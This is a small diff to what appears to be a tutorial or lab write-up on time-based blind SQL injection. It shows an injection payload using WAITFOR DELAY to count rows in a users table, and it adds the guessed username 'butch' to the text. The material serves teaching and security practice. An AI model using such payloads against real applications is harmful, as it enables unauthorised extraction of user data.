@@ -121,7 +121,7 @@ Check how many data are in the data table users. We can see from the query below
 ```SQL
 '; IF (SELECT COUNT(*) FROM users) = 1 WAITFOR DELAY '00:00:05' --
 ```
-Finding the username.
+Finding the username ```butch```.
 
 ```SQL
 -- e.g. guess username (ASCII)
